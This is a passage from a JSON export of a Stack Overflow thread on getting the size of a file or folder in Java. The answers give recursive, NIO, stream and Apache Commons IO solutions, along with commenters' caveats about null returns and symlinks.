efficiently\">stackoverflow.com/questions/116574/&hellip;</a>"},{"owner":{"account_id":110909,"reputation":45713,"user_id":293280,"accept_rate":77,"display_name":"Joshua Pinter"},"score":0,"creation_date":1571246791,"post_id":2149785,"comment_id":103179873,"body_markdown":"If you happen to be on **Android** then take a look at `StatFs`. It uses file system statistics and is nearly 1000x faster than recursive methods, which were unusable for our needs. Our implementation can be found here: https://stackoverflow.com/a/58418639/293280","body":"If you happen to be on <b>Android</b> then take a look at <code>StatFs</code>. It uses file system statistics and is nearly 1000x faster than recursive methods, which were unusable for our needs. Our implementation can be found here: <a href=\"https://stackoverflow.com/a/58418639/293280\">stackoverflow.com/a/58418639/293280</a>"}],"answers":[{"tags":[],"owner":{"account_id":75807,"reputation":81445,"user_id":217332,"accept_rate":100,"display_name":"danben"},"down_vote_count":0,"up_vote_count":4,"is_accepted":false,"score":4,"last_activity_date":1264621617,"creation_date":1264621617,"answer_id":2149797,"question_id":2149785,"body_markdown":"`File.length()` ([Javadoc][1]).\r\n\r\nNote that this doesn&#39;t work for directories, or is not guaranteed to work.\r\n\r\nFor a directory, what do you want?  If it&#39;s the total size of all files underneath it, you can recursively walk children using `File.list()` and `File.isDirectory()` and sum their sizes.\r\n\r\n\r\n  [1]: http://java.sun.com/j2se/1.5.0/docs/api/java/io/File.html#length%28%29","title":"Get size of folder or file","body":"<p><code>File.length()</code> (<a href=\"http://java.sun.com/j2se/1.5.0/docs/api/java/io/File.html#length%28%29\" rel=\"nofollow noreferrer\">Javadoc</a>).</p>\n\n<p>Note that this doesn't work for directories, or is not guaranteed to work.</p>\n\n<p>For a directory, what do you want?  If it's the total size of all files underneath it, you can recursively walk children using <code>File.list()</code> and <code>File.isDirectory()</code> and sum their sizes.</p>\n"},{"tags":[],"owner":{"account_id":7492,"reputation":63517,"user_id":13051,"accept_rate":68,"display_name":"JesperE"},"down_vote_count":0,"up_vote_count":4,"is_accepted":false,"score":4,"last_activity_date":1264621666,"creation_date":1264621666,"answer_id":2149804,"question_id":2149785,"body_markdown":"The `File` object has a `length` method:\r\n\r\n    f = new File(&quot;your/file/name&quot;);\r\n    f.length();\r\n","title":"Get size of folder or file","body":"<p>The <code>File</code> object has a <code>length</code> method:</p>\n\n<pre><code>f = new File(\"your/file/name\");\nf.length();\n</code></pre>\n"},{"tags":[],"owner":{"account_id":2164,"reputation":25680,"user_id":2979,"display_name":"Tendayi Mawushe"},"down_vote_count":0,"up_vote_count":203,"is_accepted":true,"score":203,"last_activity_date":1446028996,"creation_date":1264621699,"answer_id":2149807,"question_id":2149785,"body_markdown":"    java.io.File file = new java.io.File(&quot;myfile.txt&quot;);\r\n    file.length();\r\n\r\nThis returns the length of the file in bytes or `0` if the file does not exist. There is no built-in way to get the size of a folder, you are going to have to walk the directory tree recursively (using the `listFiles()` method of a file object that represents a directory) and accumulate the directory size for yourself:\r\n\r\n    public static long folderSize(File directory) {\r\n        long length = 0;\r\n        for (File file : directory.listFiles()) {\r\n            if (file.isFile())\r\n                length += file.length();\r\n            else\r\n                length += folderSize(file);\r\n        }\r\n        return length;\r\n    }\r\n\r\n**WARNING**: This method is not sufficiently robust for production use. `directory.listFiles()` may return `null` and cause a `NullPointerException`. Also, it doesn&#39;t consider symlinks and possibly has other failure modes. Use [this method](https://stackoverflow.com/a/19877372/1151521).","title":"Get size of folder or file","body":"<pre><code>java.io.File file = new java.io.File(\"myfile.txt\");\nfile.length();\n</code></pre>\n\n<p>This returns the length of the file in bytes or <code>0</code> if the file does not exist. There is no built-in way to get the size of a folder, you are going to have to walk the directory tree recursively (using the <code>listFiles()</code> method of a file object that represents a directory) and accumulate the directory size for yourself:</p>\n\n<pre><code>public static long folderSize(File directory) {\n    long length = 0;\n    for (File file : directory.listFiles()) {\n        if (file.isFile())\n            length += file.length();\n        else\n            length += folderSize(file);\n    }\n    return length;\n}\n</code></pre>\n\n<p><strong>WARNING</strong>: This method is not sufficiently robust for production use. <code>directory.listFiles()</code> may return <code>null</code> and cause a <code>NullPointerException</code>. Also, it doesn't consider symlinks and possibly has other failure modes. Use <a href=\"https://stackoverflow.com/a/19877372/1151521\">this method</a>.</p>\n"},{"tags":[],"owner":{"account_id":67484,"reputation":20119,"user_id":197473,"accept_rate":61,"display_name":"Vishal"},"down_vote_count":0,"up_vote_count":10,"is_accepted":false,"score":10,"last_activity_date":1264628217,"creation_date":1264621773,"answer_id":2149816,"question_id":2149785,"body_markdown":"\tpublic static long getFolderSize(File dir) {\r\n\t\tlong size = 0;\r\n\t\tfor (File file : dir.listFiles()) {\r\n\t\t\tif (file.isFile()) {\r\n\t\t\t\tSystem.out.println(file.getName() + &quot; &quot; + file.length());\r\n\t\t\t\tsize += file.length();\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t\tsize += getFolderSize(file);\r\n\t\t}\r\n\t\treturn size;\r\n\t}","title":"Get size of folder or file","body":"<pre><code>public static long getFolderSize(File dir) {\n    long size = 0;\n    for (File file : dir.listFiles()) {\n        if (file.isFile()) {\n            System.out.println(file.getName() + \" \" + file.length());\n            size += file.length();\n        }\n        else\n            size += getFolderSize(file);\n    }\n    return size;\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":63162,"reputation":102381,"user_id":187141,"accept_rate":82,"display_name":"yegor256"},"down_vote_count":3,"up_vote_count":44,"is_accepted":false,"score":41,"last_activity_date":1446028634,"creation_date":1341174719,"answer_id":11285406,"question_id":2149785,"body_markdown":"You need [`FileUtils#sizeOfDirectory(File)`](http://commons.apache.org/proper/commons-io/javadocs/api-release/org/apache/commons/io/FileUtils.html#sizeOfDirectory%28java.io.File%29) from [commons-io](http://commons.apache.org/io/).\r\n\r\nNote that you will need to manually check whether the file is a directory as the method throws an exception if a non-directory is passed to it.\r\n\r\n**WARNING**: This method (as of commons-io 2.4) has a bug and may throw `IllegalArgumentException` if the directory is concurrently modified.","title":"Get size of folder or file","body":"<p>You need <a href=\"http://commons.apache.org/proper/commons-io/javadocs/api-release/org/apache/commons/io/FileUtils.html#sizeOfDirectory%28java.io.File%29\" rel=\"noreferrer\"><code>FileUtils#sizeOfDirectory(File)</code></a> from <a href=\"http://commons.apache.org/io/\" rel=\"noreferrer\">commons-io</a>.</p>\n\n<p>Note that you will need to manually check whether the file is a directory as the method throws an exception if a non-directory is passed to it.</p>\n\n<p><strong>WARNING</strong>: This method (as of commons-io 2.4) has a bug and may throw <code>IllegalArgumentException</code> if the directory is concurrently modified.</p>\n"},{"tags":[],"owner":{"account_id":1518185,"reputation":11427,"user_id":1418643,"accept_rate":75,"display_name":"Aksel Willgert"},"down_vote_count":0,"up_vote_count":48,"is_accepted":false,"score":48,"last_activity_date":1479712906,"creation_date":1384009238,"answer_id":19877372,"question_id":2149785,"body_markdown":"Using java-7 nio api, calculating the folder size can be done a lot quicker.\r\n\r\nHere is a ready to run example that is robust and won&#39;t throw an exception. It will log directories it can&#39;t enter or had trouble traversing. Symlinks are ignored, and concurrent modification of the directory won&#39;t cause more trouble than necessary.\r\n\r\n\t/**\r\n\t * Attempts to calculate the size of a file or directory.\r\n\t * \r\n\t * &lt;p&gt;\r\n\t * Since the operation is non-atomic, the returned value may be inaccurate.\r\n\t * However, this method is quick and does its best.\r\n\t */\r\n\tpublic static long size(Path path) {\r\n\t\r\n\t\tfinal AtomicLong size = new AtomicLong(0);\r\n\t\r\n\t\ttry {\r\n\t\t\tFiles.walkFileTree(path, new SimpleFileVisitor&lt;Path&gt;() {\r\n\t\t\t\t@Override\r\n\t\t\t\tpublic FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {\r\n\t\r\n\t\t\t\t\tsize.addAndGet(attrs.size());\r\n\t\t\t\t\treturn FileVisitResult.CONTINUE;\r\n\t\t\t\t}\r\n\t\r\n\t\t\t\t@Override\r\n\t\t\t\tpublic FileVisitResult visitFileFailed(Path file, IOException exc) {\r\n\t\r\n\t\t\t\t\tSystem.out.println(&quot;skipped: &quot; + file + &quot; (&quot; + exc + &quot;)&quot;);\r\n\t\t\t\t\t// Skip folders that can&#39;t be traversed\r\n\t\t\t\t\treturn FileVisitResult.CONTINUE;\r\n\t\t\t\t}\r\n\t\r\n\t\t\t\t@Override\r\n\t\t\t\tpublic FileVisitResult postVisitDirectory(Path dir, IOException exc) {\r\n\t\r\n\t\t\t\t\tif (exc != null)\r\n\t\t\t\t\t\tSystem.out.println(&quot;had trouble traversing: &quot; + dir + &quot; (&quot; + exc + &quot;)&quot;);\r\n\t\t\t\t\t// Ignore errors traversing a folder\r\n\t\t\t\t\treturn FileVisitResult.CONTINUE;\r\n\t\t\t\t}\r\n\t\t\t});\r\n\t\t} catch (IOException e) {\r\n\t\t\tthrow new AssertionError(&quot;walkFileTree will not throw IOException if the FileVisitor does not&quot;);\r\n\t\t}\r\n\t\r\n\t\treturn size.get();\r\n\t}","title":"Get size of folder or file","body":"<p>Using java-7 nio api, calculating the folder size can be done a lot quicker.</p>\n\n<p>Here is a ready to run example that is robust and won't throw an exception. It will log directories it can't enter or had trouble traversing. Symlinks are ignored, and concurrent modification of the directory won't cause more trouble than necessary.</p>\n\n<pre><code>/**\n * Attempts to calculate the size of a file or directory.\n * \n * &lt;p&gt;\n * Since the operation is non-atomic, the returned value may be inaccurate.\n * However, this method is quick and does its best.\n */\npublic static long size(Path path) {\n\n    final AtomicLong size = new AtomicLong(0);\n\n    try {\n        Files.walkFileTree(path, new SimpleFileVisitor&lt;Path&gt;() {\n            @Override\n            public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {\n\n                size.addAndGet(attrs.size());\n                return FileVisitResult.CONTINUE;\n            }\n\n            @Override\n            public FileVisitResult visitFileFailed(Path file, IOException exc) {\n\n                System.out.println(\"skipped: \" + file + \" (\" + exc + \")\");\n                // Skip folders that can't be traversed\n                return FileVisitResult.CONTINUE;\n            }\n\n            @Override\n            public FileVisitResult postVisitDirectory(Path dir, IOException exc) {\n\n                if (exc != null)\n                    System.out.println(\"had trouble traversing: \" + dir + \" (\" + exc + \")\");\n                // Ignore errors traversing a folder\n                return FileVisitResult.CONTINUE;\n            }\n        });\n    } catch (IOException e) {\n        throw new AssertionError(\"walkFileTree will not throw IOException if the FileVisitor does not\");\n    }\n\n    return size.get();\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":1212298,"reputation":27075,"user_id":1180621,"accept_rate":100,"display_name":"Andrejs"},"down_vote_count":0,"up_vote_count":23,"is_accepted":false,"score":23,"last_activity_date":1405425852,"creation_date":1405333127,"answer_id":24734290,"question_id":2149785,"body_markdown":"In Java 8:\r\n\r\n    long size = Files.walk(path).mapToLong( p -&gt; p.toFile().length() ).sum();\r\n\r\nIt would be nicer to use `Files::size` in the map step but it throws a checked exception.\r\n\r\nUPDATE:  \r\nYou should also be aware that this can throw an exception if some of the files/folders are not accessible. See this [question][1] and another solution using [Guava][2].\r\n\r\n\r\n  [1]: https://stackoverflow.com/questions/22867286/files-walk-calculate-total-size\r\n  [2]: https://stackoverflow.com/a/24757556/1180621","title":"Get size of folder or file","body":"<p>In Java 8:</p>\n\n<pre><code>long size = Files.walk(path).mapToLong( p -&gt; p.toFile().length() ).sum();\n</code></pre>\n\n<p>It would be nicer to use <code>Files::size</code> in the map step but it throws a checked exception.</p>\n\n<p>UPDATE:<br>\nYou should also be aware that this can throw an exception if some of the files/folders are not accessible. See this <a href=\"https://stackoverflow.com/questions/22867286/files-walk-calculate-total-size\">question</a> and another solution using <a href=\"https://stackoverflow.com/a/24757556/1180621\">Guava</a>.</p>\n"},{"tags":[],"owner":{"account_id":1874735,"reputation":8514,"user_id":1696171,"accept_rate":73,"display_name":"Eric Cochran"},"down_vote_count":0,"up_vote_count":5,"is_accepted":false,"score":5,"last_activity_date":1408684065,"creation_date":1408683122,"answer_id":25439778,"question_id":2149785,"body_markdown":"Here&#39;s the best way to get a general File&#39;s size (works for directory and non-directory):\r\n\r\n    public static long getSize(File file) {\r\n        long size;\r\n        if (file.isDirectory()) {\r\n            size = 0;\r\n            for (File child : file.listFiles()) {\r\n                size += getSize(child);\r\n            }\r\n        } else {\r\n            size = file.length();\r\n        }\r\n        return size;\r\n    }\r\n\r\nEdit: Note that this is probably going to be a time-consuming operation.  Don&#39;t run it on the UI thread.\r\n\r\nAlso, here (taken from https://stackoverflow.com/a/5599842/1696171) is a nice way to get a user-readable String from the long returned:\r\n\r\n    public static String getReadableSize(long size) {\r\n        if(size &lt;= 0) return &quot;0&quot;;\r\n        final String[] units = new String[] { &quot;B&quot;, &quot;KB&quot;, &quot;MB&quot;, &quot;GB&quot;, &quot;TB&quot; };\r\n        int digitGroups = (int) (Math.log10(size)/Math.log10(1024));\r\n        return new DecimalFormat(&quot;#,##0.#&quot;).format(size/Math.pow(1024, digitGroups))\r\n                + &quot; &quot; + units[digitGroups];\r\n    }","title":"Get size of folder or file","body":"<p>Here's the best way to get a general File's size (works for directory and non-directory):</p>\n\n<pre><code>public static long getSize(File file) {\n    long size;\n    if (file.isDirectory()) {\n        size = 0;\n        for (File child : file.listFiles()) {\n            size += getSize(child);\n        }\n    } else {\n        size = file.length();\n    }\n    return size;\n}\n</code></pre>\n\n<p>Edit: Note that this is probably going to be a time-consuming operation.  Don't run it on the UI thread.</p>\n\n<p>Also, here (taken from <a href=\"https://stackoverflow.com/a/5599842/1696171\">https://stackoverflow.com/a/5599842/1696171</a>) is a nice way to get a user-readable String from the long returned:</p>\n\n<pre><code>public static String getReadableSize(long size) {\n    if(size &lt;= 0) return \"0\";\n    final String[] units = new String[] { \"B\", \"KB\", \"MB\", \"GB\", \"TB\" };\n    int digitGroups = (int) (Math.log10(size)/Math.log10(1024));\n    return new DecimalFormat(\"#,##0.#\").format(size/Math.pow(1024, digitGroups))\n            + \" \" + units[digitGroups];\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":3378788,"reputation":3599,"user_id":2836350,"accept_rate":88,"display_name":"Nicholas"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1412534956,"creation_date":1412534956,"answer_id":26206027,"question_id":2149785,"body_markdown":"    public long folderSize (String directory)\r\n    \t{\r\n    \t\tFile curDir = new File(directory);\r\n    \t\tlong length = 0;\r\n    \t\tfor(File f : curDir.listFiles())\r\n    \t\t{\r\n    \t\t\tif(f.isDirectory())\r\n    \t\t\t{\t\t\t\t\r\n    \t\t\t\t for ( File child : f.listFiles()) \r\n    \t\t\t\t {\r\n    \t\t\t\t\t length = length + child.length();\r\n    \t\t\t     }\r\n    \t\t\t\t \r\n    \t\t\t\tSystem.out.println(&quot;Directory: &quot; + f.getName() + &quot; &quot; + length + &quot;kb&quot;);\r\n    \t\t\t}\r\n    \t\t\telse\r\n    \t\t\t{\r\n    \t\t\t\tlength = f.length();\r\n    \t\t\t\tSystem.out.println(&quot;File: &quot; + f.getName() + &quot; &quot; + length + &quot;kb&quot;);\r\n    \t\t\t}\r\n    \t\t\tlength = 0;\r\n    \t\t}\r\n    \t\treturn length;\r\n    \t}","title":"Get size of folder or file","body":"<pre><code>public long folderSize (String directory)\n    {\n        File curDir = new File(directory);\n        long length = 0;\n        for(File f : curDir.listFiles())\n        {\n            if(f.isDirectory())\n            {               \n                 for ( File child : f.listFiles()) \n                 {\n                     length = length + child.length();\n                 }\n\n                System.out.println(\"Directory: \" + f.getName() + \" \" + length + \"kb\");\n            }\n            else\n            {\n                length = f.length();\n                System.out.println(\"File: \" + f.getName() + \" \" + length + \"kb\");\n            }\n            length = 0;\n        }\n        return length;\n    }\n</code></pre>\n"},{"tags":[],"owner":{"account_id":6329420,"reputation":1564,"user_id":4914757,"accept_rate":60,"display_name":"A.B."},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1485015785,"creation_date":1485015785,"answer_id":41781646,"question_id":2149785,"body_markdown":"After lot of  researching and looking into different solutions proposed here at StackOverflow. I finally decided to write my own solution. My purpose is to have no-throw mechanism because I don&#39;t want to crash if the API is unable to fetch the folder size. *This method is not suitable for mult-threaded scenario.*\r\n\r\nFirst of all I want to check for valid directories while traversing down the file system tree.\r\n\r\n    private static boolean isValidDir(File dir){\r\n        if (dir != null &amp;&amp; dir.exists() &amp;&amp; dir.isDirectory()){\r\n            return true;\r\n        }else{\r\n            return false;\r\n        }\r\n    }\r\n    \r\nSecond I do not want my recursive call to go into symlinks (softlinks) and include the size in total aggregate.\r\n    \r\n    public static boolean isSymlink(File file) throws IOException {\r\n        File canon;\r\n        if (file.getParent() == null) {\r\n            canon = file;\r\n        } else {\r\n            canon = new File(file.getParentFile().getCanonicalFile(),\r\n                    file.getName());\r\n        }\r\n        return !canon.getCanonicalFile().equals(canon.getAbsoluteFile());\r\n    }\r\n    \r\nFinally my recursion based implementation to fetch the size of the specified directory. Notice the null check for dir.listFiles(). According to javadoc there is a possibility that this method can return null.\r\n\r\n    public static long getDirSize(File dir){\r\n        if (!isValidDir(dir))\r\n            return 0L;\r\n        File[] files = dir.listFiles();\r\n        //Guard for null pointer exception on files\r\n        if (files == null){\r\n            return 0L;\r\n        }else{\r\n            long size = 0L;\r\n            for(File file : files){\r\n                if (file.isFile()){\r\n                    size += file.length();\r\n                }else{\r\n                    try{\r\n                        if (!isSymlink(file)) size += getDirSize(file);\r\n                    }catch (IOException ioe){\r\n                        //digest exception\r\n                    }\r\n                }\r\n            }\r\n            return size;\r\n        }\r\n    }\r\n\r\nSome cream on the cake, the API to get the size of the list Files (might be all of files and folder under root).\r\n\r\n    public static long getDirSize(List&lt;File&gt; files){\r\n        long size = 0L;\r\n        for(File file : files){\r\n            if (file.isDirectory()){\r\n                size += getDirSize(file);\r\n            } else {\r\n                size += file.length();\r\n            }\r\n        }\r\n        return size;\r\n    }","title":"Get size of folder or file","body":"<p>After lot of  researching and looking into different solutions proposed here at StackOverflow. I finally decided to write my own solution. My purpose is to have no-throw mechanism because I don't want to crash if the API is unable to fetch the folder size. <em>This method is not suitable for mult-threaded scenario.</em></p>\n\n<p>First of all I want to check for valid directories while traversing down the file system tree.</p>\n\n<pre><code>private static boolean isValidDir(File dir){\n    if (dir != null &amp;&amp; dir.exists() &amp;&amp; dir.isDirectory()){\n        return true;\n    }else{\n        return false;\n    }\n}\n</code></pre>\n\n<p>Second I do not want my recursive call to go into symlinks (softlinks) and include the size in total aggregate.</p>\n\n<pre><code>public static boolean isSymlink(File file) throws IOException {\n    File canon;\n    if (file.getParent() == null) {\n        canon = file;\n    } else {\n        canon = new File(file.getParentFile().getCanonicalFile(),\n                file.getName());\n    }\n    return !canon.getCanonicalFile().equals(canon.getAbsoluteFile());\n}\n</code></pre>\n\n<p>Finally my recursion based implementation to fetch the size of the specified directory. Notice the null check for dir.listFiles(). According to javadoc there is a possibility that this method can return null.</p>\n\n<pre><code>public static long getDirSize(File dir){\n    if (!isValidDir(dir))\n        return 0L;\n    File[] files = dir.listFiles();\n    //Guard for null pointer exception on files\n    if (files == null){\n        return 0L;\n    }else{\n        long size = 0L;\n        for(File file : files){\n            if (file.isFile()){\n                size += file.length();\n            }else{\n                try{\n                    if (!isSymlink(file)) size += getDirSize(file);\n                }catch (IOException ioe){\n                    //digest exception\n                }\n            }\n        }\n        return size;\n    }\n}\n</code></pre>\n\n<p>Some cream on the cake, the API to get the size of the list Files (might be all of files and folder under root).</p>\n\n<pre><code>public static long getDirSize(List&lt;File&gt; files){\n    long size = 0L;\n    for(File file : files){\n        if (file.isDirectory()){\n            size += getDirSize(file);\n        } else {\n            size += file.length();\n        }\n    }\n    return size;\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":3971227,"reputation":8507,"user_id":3275788,"display_name":"wumpz"},"down_vote_count":0,"up_vote_count":8,"is_accepted":false,"score":8,"last_activity_date":1487685891,"creation_date":1487685891,"answer_id":42369511,"question_id":2149785,"body_markdown":"For **Java 8** this is one right way to do it:\r\n\r\n    Files.walk(new File(&quot;D:/temp&quot;).toPath())\r\n                    .map(f -&gt; f.toFile())\r\n                    .filter(f -&gt; f.isFile())\r\n                    .mapToLong(f -&gt; f.length()).sum()\r\n\r\n**It is important to filter out all directories**, because the length method isn&#39;t guaranteed to be 0 for directories.\r\n\r\nAt least this code delivers the same size information like Windows Explorer itself does.","title":"Get size of folder or file","body":"<p>For <strong>Java 8</strong> this is one right way to do it:</p>\n\n<pre><code>Files.walk(new File(\"D:/temp\").toPath())\n                .map(f -&gt; f.toFile())\n                .filter(f -&gt; f.isFile())\n                .mapToLong(f -&gt; f.length()).sum()\n</code></pre>\n\n<p><strong>It is important to filter out all directories</strong>, because the length method isn't guaranteed to be 0 for directories.</p>\n\n<p>At least this code delivers the same size information like Windows Explorer itself does.</p>\n"},{"tags":[],"owner":{"account_id":7190950,"reputation":1818,"user_id":5515843,"accept_rate":100,"display_name":"bobasti"},"down_vote_count":0,"up_vote_count":4,"is_accepted":false,"score":4,"last_activity_date":1488651483,"creation_date":1488651483,"answer_id":42599581,"question_id":2149785,"body_markdown":"If you want to use **Java 8 NIO** API, the following program will print the size, in bytes, of the directory it is located in.\r\n\r\n    import java.io.IOException;\r\n    import java.nio.file.Files;\r\n    import java.nio.file.Path;\r\n    import java.nio.file.Paths;\r\n    \r\n    public class PathSize {\r\n    \t\r\n    \tpublic static void main(String[] args) {\r\n    \t\tPath path = Paths.get(&quot;.&quot;);\r\n    \t\tlong size = calculateSize(path);\r\n    \t\tSystem.out.println(size);\r\n    \t}\r\n    \r\n    \t/**\r\n    \t * Returns the size, in bytes, of the specified &lt;tt&gt;path&lt;/tt&gt;. If the given\r\n    \t * path is a regular file, trivially its size is returned. Else the path is\r\n    \t * a directory and its contents are recursively explored, returning the\r\n    \t * total sum of all files within the directory.\r\n    \t * &lt;p&gt;\r\n    \t * If an I/O exception occurs, it is suppressed within this method and\r\n    \t * &lt;tt&gt;0&lt;/tt&gt; is returned as the size of the specified &lt;tt&gt;path&lt;/tt&gt;.\r\n    \t * \r\n    \t * @param path path whose size is to be returned\r\n    \t * @return size of the specified path\r\n    \t */\r\n    \tpublic static long calculateSize(Path path) {\r\n    \t\ttry {\r\n    \t\t\tif (Files.isRegularFile(path)) {\r\n    \t\t\t\treturn Files.size(path);\r\n    \t\t\t}\r\n    \r\n    \t\t\treturn Files.list(path).mapToLong(PathSize::calculateSize).sum();\r\n    \t\t} catch (IOException e) {\r\n    \t\t\treturn 0L;\r\n    \t\t}\r\n    \t}\r\n    \r\n    }\r\n    \r\nThe `calculateSize` method is universal for `Path` objects, so it also works for files.\r\n**Note** that if a file or directory is inaccessible, in this case the returned *size* of the path object will be `0`.","title":"Get size of folder or file","body":"<p>If you want to use <strong>Java 8 NIO</strong> API, the following program will print the size, in bytes, of the directory it is located in.</p>\n\n<pre><code>import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\n\npublic class PathSize {\n\n    public static void main(String[] args) {\n        Path path = Paths.get(\".\");\n        long size = calculateSize(path);\n        System.out.println(size);\n    }\n\n    /**\n     * Returns the size, in bytes, of the specified &lt;tt&gt;path&lt;/tt&gt;. If the given\n     * path is a regular file, trivially its size is returned. Else the path is\n     * a directory and its contents are recursively explored, returning the\n     * total sum of all files within the directory.\n     * &lt;p&gt;\n     * If an I/O exception occurs, it is suppressed within this method and\n     * &lt;tt&gt;0&lt;/tt&gt; is returned as the size of the specified &lt;tt&gt;path&lt;/tt&gt;.\n     * \n     * @param path path whose size is to be returned\n     * @return size of the specified path\n     */\n    public static long calculateSize(Path path) {\n        try {\n            if (Files.isRegularFile(path)) {\n                return Files.size(path);\n            }\n\n            return Files.list(path).mapToLong(PathSize::calculateSize).sum();\n        } catch (IOException e) {\n            return 0L;\n        }\n    }\n\n}\n</code></pre>\n\n<p>The <code>calculateSize</code> method is universal for <code>Path</code> objects, so it also works for files.\n<strong>Note</strong> that if a file or directory is inaccessible, in this case the returned <em>size</em> of the path object will be <code>0</code>.</p>\n"},{"tags":[],"owner":{"account_id":9702344,"reputation":227,"user_id":7196898,"display_name":"Prem S"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1490988462,"creation_date":1490988462,"answer_id":43148304,"question_id":2149785,"body_markdown":"in linux if you want to sort directories then  du -hs * | sort -h\r\n","title":"Get size of folder or file","body":"<p>in linux if you want to sort directories then  du -hs * | sort -h</p>\n"},{"tags":[],"owner":{"account_id":1146772,"reputation":31458,"user_id":1129332,"accept_rate":61,"display_name":"Ilya Gazman"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1508080549,"creation_date":1508080549,"answer_id":46756579,"question_id":2149785,"body_markdown":" - Works for **Android** and **Java**\r\n - Works for both folders and files\r\n - Checks for null pointer everywhere where needed\r\n - Ignores [symbolic link][1] aka shortcuts \r\n - **Production ready!**\r\n\r\nSource code:\r\n\r\n       public long fileSize(File root) {\r\n            if(root == null){\r\n                return 0;\r\n            }\r\n            if(root.isFile()){\r\n                return root.length();\r\n            }\r\n            try {\r\n                if(isSymlink(root)){\r\n                    return 0;\r\n                }\r\n            } catch (IOException e) {\r\n                e.printStackTrace();\r\n                return 0;\r\n            }\r\n    \r\n            long length = 0;\r\n            File[] files = root.listFiles();\r\n            if(files == null){\r\n                return 0;\r\n            }\r\n            for (File file : files) {\r\n                length += fileSize(file);\r\n            }\r\n    \r\n            return length;\r\n        }\r\n    \r\n        private static boolean isSymlink(File file) throws IOException {\r\n            File canon;\r\n            if (file.getParent() == null) {\r\n                canon = file;\r\n            } else {\r\n                File canonDir = file.getParentFile().getCanonicalFile();\r\n                canon = new File(canonDir, file.getName());\r\n            }\r\n            return !canon.getCanonicalFile().equals(canon.getAbsoluteFile());\r\n        }\r\n\r\n\r\n  [1]: https://stackoverflow.com/a/813730/1129332","title":"Get size of folder or file","body":"<ul>\n<li>Works for <strong>Android</strong> and <strong>Java</strong></li>\n<li>Works for both folders and files</li>\n<li>Checks for null pointer everywhere where needed</li>\n<li>Ignores <a href=\"https://stackoverflow.com/a/813730/1129332\">symbolic link</a> aka shortcuts </li>\n<li><strong>Production ready!</strong></li>\n</ul>\n\n<p>Source code:</p>\n\n<pre><code>   public long fileSize(File root) {\n        if(root == null){\n            return 0;\n        }\n        if(root.isFile()){\n            return root.length();\n        }\n        try {\n            if(isSymlink(root)){\n                return 0;\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n            return 0;\n        }\n\n        long length = 0;\n        File[] files = root.listFiles();\n        if(files == null){\n            return 0;\n        }\n        for (File file : files) {\n            length += fileSize(file);\n        }\n\n        return length;\n    }\n\n    private static boolean isSymlink(File file) throws IOException {\n        File canon;\n        if (file.getParent() == null) {\n            canon = file;\n        } else {\n            File canonDir = file.getParentFile().getCanonicalFile();\n            canon = new File(canonDir, file.getName());\n        }\n        return !canon.getCanonicalFile().equals(canon.getAbsoluteFile());\n    }\n</code></pre>\n"},{"tags":[],"owner":{"account_id":4324570,"reputation":41,"user_id":3531734,"display_name":"It&#39;s PD"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1563363044,"creation_date":1563363044,"answer_id":57074824,"question_id":2149785,"body_markdown":"for windows, using java.io this reccursive function is useful.\r\n\r\n        public static long folderSize(File directory) {\r\n        long length = 0;\r\n        \r\n        if (directory.isFile())\r\n        \t length += directory.length();\r\n        else{\r\n        \tfor (File file : directory.listFiles()) {\r\n        \t\t if (file.isFile())\r\n                     length += file.length();\r\n                 else\r\n                     length += folderSize(file);\r\n        \t}\r\n        }\r\n      \r\n        return length;\r\n    }\r\n    \r\n\r\nThis is tested and working properly on my end.","title":"Get size of folder or file","body":"<p>for windows, using java.io this reccursive function is useful.</p>\n\n<pre><code>    public static long folderSize(File directory) {\n    long length = 0;\n\n    if (directory.isFile())\n         length += directory.length();\n    else{\n        for (File file : directory.listFiles()) {\n             if (file.isFile())\n                 length += file.length();\n             else\n                 length += folderSize(file);\n        }\n    }\n\n    return length;\n}\n</code></pre>\n\n<p>This is tested and working properly on my end.</p>\n"},{"tags":[],"owner":{"account_id":3723758,"reputation":11894,"user_id":3600553,"accept_rate":71,"display_name":"Du-Lacoste"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1573437669,"creation_date":1573437162,"answer_id":58794642,"question_id":2149785,"body_markdown":"You can use `Apache Commons IO` to find the folder size easily. \r\n\r\nIf you are on maven, please add the following dependency in your `pom.xml` file.\r\n\r\n    &lt;!-- https://mvnrepository.com/artifact/commons-io/commons-io --&gt;\r\n    &lt;dependency&gt;\r\n        &lt;groupId&gt;commons-io&lt;/groupId&gt;\r\n        &lt;artifactId&gt;commons-io&lt;/artifactId&gt;\r\n        &lt;version&gt;2.6&lt;/version&gt;\r\n    &lt;/dependency&gt;\r\n\r\nIf not a fan of Maven, download the following jar and add it to the class path.\r\n\r\nhttps://repo1.maven.org/maven2/commons-io/commons-io/2.6/commons-io-2.6.jar\r\n\r\n    public long getFolderSize() {\r\n   \r\n        File folder = new File(&quot;src/test/resources&quot;);\r\n        long size = FileUtils.sizeOfDirectory(folder);\r\n     \r\n        return size; // in bytes\r\n    }\r\n\r\n\r\n\r\nTo get file size via Commons IO,\r\n\r\n    File file = new File(&quot;ADD YOUR PATH TO FILE&quot;);\r\n    \r\n    long fileSize = FileUtils.sizeOf(file);\r\n    \r\n    System.out.println(fileSize); // bytes\r\n\r\nIt is also achievable via `Google Guava` \r\n\r\nFor Maven, add the following:\r\n\r\n    &lt;!-- https://mvnrepository.com/artifact/com.google.guava/guava --&gt;\r\n    &lt;dependency&gt;\r\n        &lt;groupId&gt;com.google.guava&lt;/groupId&gt;\r\n        &lt;artifactId&gt;guava&lt;/artifactId&gt;\r\n        &lt;version&gt;28.1-jre&lt;/version&gt;\r\n    